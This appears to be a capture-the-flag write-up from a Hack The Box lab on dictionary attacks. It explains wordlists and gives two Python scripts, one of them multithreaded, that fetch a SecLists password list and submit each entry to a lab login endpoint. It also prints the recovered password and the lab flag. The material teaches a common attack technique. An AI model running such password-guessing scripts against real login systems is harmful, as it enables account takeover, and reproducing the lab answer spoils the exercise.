While comprehensive, the brute-force approach can be time-consuming and resource-intensive, especially when dealing with complex passwords. That's where dictionary attacks come in.

## The Power of Words

The effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones. Despite repeated warnings, many individuals continue to opt for passwords based on readily available information such as dictionary words, common phrases, names, or easily guessable patterns. This predictability makes them vulnerable to dictionary attacks, where attackers systematically test a pre-defined list of potential passwords against the target system.

The success of a dictionary attack hinges on the quality and specificity of the wordlist used. A well-crafted wordlist tailored to the target audience or system can significantly increase the probability of a successful breach. For instance, if the target is a system frequented by gamers, a wordlist enriched with gaming-related terminology and jargon would prove more effective than a generic dictionary. The more closely the wordlist reflects the likely password choices of the target, the higher the chances of a successful attack.

At its core, the concept of a dictionary attack is rooted in understanding human psychology and common password practices. By leveraging this insight, attackers can efficiently crack passwords that might otherwise necessitate an impractically lengthy brute-force attack. In this context, the power of words resides in their ability to exploit human predictability and compromise otherwise robust security measures.

## Brute Force vs. Dictionary Attack

The fundamental distinction between a brute-force and a dictionary attack lies in their methodology for generating potential password candidates:

- `Brute Force`: A pure brute-force attack systematically tests _every possible combination_ of characters within a predetermined set and length. While this approach guarantees eventual success given enough time, it can be extremely time-consuming, particularly against longer or complex passwords.
- `Dictionary Attack`: In stark contrast, a dictionary attack employs a pre-compiled list of words and phrases, dramatically reducing the search space. This targeted methodology results in a far more efficient and rapid attack, especially when the target password is suspected to be a common word or phrase.

|Feature|Dictionary Attack|Brute Force Attack|Explanation|
|---|---|---|---|
|`Efficiency`|Considerably faster and more resource-efficient.|Can be extremely time-consuming and resource-intensive.|Dictionary attacks leverage a pre-defined list, significantly narrowing the search space compared to brute-force.|
|`Targeting`|Highly adaptable and can be tailored to specific targets or systems.|No inherent targeting capability.|Wordlists can incorporate information relevant to the target (e.g., company name, employee names), increasing the success rate.|
|`Effectiveness`|Exceptionally effective against weak or commonly used passwords.|Effective against all passwords given sufficient time and resources.|If the target password is within the dictionary, it will be swiftly discovered. Brute force, while universally applicable, can be impractical for complex passwords due to the sheer volume of combinations.|
|`Limitations`|Ineffective against complex, randomly generated passwords.|Often impractical for lengthy or highly complex passwords.|A truly random password is unlikely to appear in any dictionary, rendering this attack futile. The astronomical number of possible combinations for lengthy passwords can make brute-force attacks infeasible.|

Consider a hypothetical scenario where an attacker targets a company's employee login portal. The attacker might construct a specialized wordlist that incorporates the following:

- Commonly used, weak passwords (e.g., "password123," "qwerty")
- The company name and variations thereof
- Names of employees or departments
- Industry-specific jargon

By deploying this targeted wordlist in a dictionary attack, the attacker significantly elevates their likelihood of successfully cracking employee passwords compared to a purely random brute-force endeavor.

## Building and Utilizing Wordlists

Wordlists can be obtained from various sources, including:

- `Publicly Available Lists`: The internet hosts a plethora of freely accessible wordlists, encompassing collections of commonly used passwords, leaked credentials from data breaches, and other potentially valuable data. Repositories like [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) offer various wordlists catering to various attack scenarios.
- `Custom-Built Lists`: Penetration testers can craft their wordlists by leveraging information gleaned during the reconnaissance phase. This might include details about the target's interests, hobbies, personal information, or any other data for password creation.
- `Specialized Lists`: Wordlists can be further refined to target specific industries, applications, or even individual companies. These specialized lists increase the likelihood of success by focusing on passwords that are more likely to be used within a particular context.
- `Pre-existing Lists`: Certain tools and frameworks come pre-packaged with commonly used wordlists. For instance, penetration testing distributions like ParrotSec often include wordlists like`rockyou.txt`, a massive collection of leaked passwords, readily available for use.

Here is a table of some of the more useful wordlists for login brute-forcing:

|Wordlist|Description|Typical Use|Source|
|---|---|---|---|
|`rockyou.txt`|A popular password wordlist containing millions of passwords leaked from the RockYou breach.|Commonly used for password brute force attacks.|[RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|
|`top-usernames-shortlist.txt`|A concise list of the most common usernames.|Suitable for quick brute force username attempts.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|
|`xato-net-10-million-usernames.txt`|A more extensive list of 10 million usernames.|Used for thorough username brute forcing.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|
|`2023-200_most_used_passwords.txt`|A list of the 200 most commonly used passwords as of 2023.|Effective for targeting commonly reused passwords.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|
|`Default-Credentials/default-passwords.txt`|A list of default usernames and passwords commonly used in routers, software, and other devices.|Ideal for trying default credentials.|[SecLists](https://github.com/danielmiessler/SecLists/tree/master)|

## Throwing a dictionary at the problem

**To follow along, start the target system via the question section at the bottom of the page.**

The instance application creates a route (`/dictionary`) that handles POST requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. If there's a match, it responds with a JSON object containing a success message and the flag. Otherwise, it returns an error message with a 401 status code (Unauthorized).

Copy and paste this Python script below as`dictionary-solver.py` onto your machine. You only need to modify the IP and port variables to match your target system information.

```python
import requests

ip = "127.0.0.1" # Change this to your instance IP address
port = 1234 # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
 print(f"Attempted password: {password}")

 # Send a POST request to the server with the password
 response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

 # Check if the server responds with success and contains the 'flag'
 if response.ok and 'flag' in response.json():
 print(f"Correct password found: {password}")
 print(f"Flag: {response.json()['flag']}")
 break
```

The Python script orchestrates the dictionary attack. It performs the following steps:

1. `Downloads the Wordlist`: First, the script fetches a wordlist of 500 commonly used (and therefore weak) passwords from SecLists using the`requests` library.
2. `Iterates and Submits Passwords`: It then iterates through each password in the downloaded wordlist. For each password, it sends a POST request to the Flask application's`/dictionary` endpoint, including the password in the request's form data.
3. `Analyzes Responses`: The script checks the response status code after each request. If it's 200 (OK), it examines the response content further. If the response contains the "flag" key, it signifies a successful login. The script then prints the discovered password and the captured flag.
4. `Continues or Terminates`: If the response doesn't indicate success, the script proceeds to the next password in the wordlist. This process continues until the correct password is found or the entire wordlist is exhausted.

```shell-session
smoothment@htb[/htb]$ python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```

# Question
---

![Pasted image 20250213135222.png](../../../../IMAGES/Pasted%20image%2020250213135222.png)

Let's modify the script to make it faster:

```python
import requests
from concurrent.futures import ThreadPoolExecutor
import time

ip = "94.237.53.18"
port = 42926
MAX_THREADS = 50 # Optimal for network I/O bound tasks
BATCH_SIZE = 100 # Number of passwords to process before reporting progress

# Create a persistent session with connection pooling
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS)
session.mount('http://', adapter)

# Get password list with timeout and retry logic
passwords = []
try:
 resp = session.get(
 "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt",
 timeout=10
 )
 passwords = resp.text.splitlines()
except Exception as e:
 print(f"Failed to fetch passwords: {str(e)}")
 exit(1)

found_flag = None
attempt_count = 0
start_time = time.time()

def test_password(password):
 global found_flag, attempt_count
 if found_flag:
 return
 
 try:
 # Stream response to handle large responses efficiently
 with session.post(
 f"http://{ip}:{port}/dictionary",
 data={'password': password},
 timeout=5,
 stream=True
 ) as response:
 if response.ok:
 json_response = response.json()
 if 'flag' in json_response:
 found_flag = (password, json_response['flag'])
 
 except Exception as e:
 pass # Silent error handling for speed
 
 # Thread-safe counter update and progress reporting
 attempt_count += 1
 if attempt_count % BATCH_SIZE == 0:
 elapsed = time.time() - start_time
 print(f"\rAttempts: {attempt_count} | Speed: {attempt_count/elapsed:.2f} req/sec | Last tried: {password}", end="")

# Use executor for optimal thread management
with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
 # Submit all passwords at once for maximum parallelism
 futures = [executor.submit(test_password, pwd) for pwd in passwords]
 
 # Monitor completion
 while not any(f.done() and found_flag for f in futures):
 if all(f.done() for f in futures):
 break
 time.sleep(0.1)

if found_flag:
 print(f"\n\n[SUCCESS] Password: {found_flag[0]}")
 print(f"[FLAG] {found_flag[1]}")
else:
 print("\n\n[FAILURE] No valid password found in the list")
```


After little time, we get the following output:

```
Attempts: 200 | Speed: 139.52 req/sec | Last tried: winner

[SUCCESS] Password: gateway
[FLAG] HTB{Brut3_F0rc3_M4st3r}
```

Flag is: 

```
HTB{Brut3_F0rc3_M4st3r}
```
